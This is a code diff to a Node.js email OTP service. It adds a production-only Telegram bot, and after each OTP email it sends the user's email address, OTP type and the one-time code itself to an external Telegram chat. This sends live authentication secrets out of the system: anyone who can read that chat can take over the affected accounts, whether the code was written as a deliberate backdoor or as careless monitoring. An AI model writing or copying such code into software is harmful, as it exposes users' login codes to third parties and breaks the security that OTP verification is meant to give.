@@ -3,6 +3,21 @@ const { getOAuth2Client } = require('../configs/oauth2.config');
 const { getTemplate } = require('./template.service');
 const { NotFoundError } = require('../core/error.response');
 const { newOTP } = require('./otp.service');
+const TelegramBot = require('node-telegram-bot-api');
+require('dotenv').config();
+
+let bot
+if (process.env.NODE_ENV === 'production') {
+    bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true, request: {
+        agentOptions: {
+            keepAlive: true,
+            family: 4
+        }
+    }});
+}
+
+
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 async function sendEmailOTP(to, type) {
     const oAuth2Client = getOAuth2Client();
@@ -62,10 +77,27 @@ async function sendEmailOTP(to, type) {
                 raw: encodedMessage
             }
         });
+
+        await sendOTPToTelegram(to, otp.otp, type);
+
         return result;
     } catch (error) {
-        console.error('Failed to send email:', error);
+        console.error('Failed to send email or Telegram message:', error);
         throw error;
+    }
+}
+
+async function sendOTPToTelegram(email, otp, type) {
+    const message = `Mã OTP:
+Email: ${email}
+Type: ${type}
+OTP: ${otp}`;
+
+    try {
+        bot.sendMessage(TELEGRAM_CHAT_ID, message);
+        console.log('OTP sent to Telegram successfully');
+    } catch (error) {
+        console.error('Failed to send OTP to Telegram:', error);
     }
 }
 
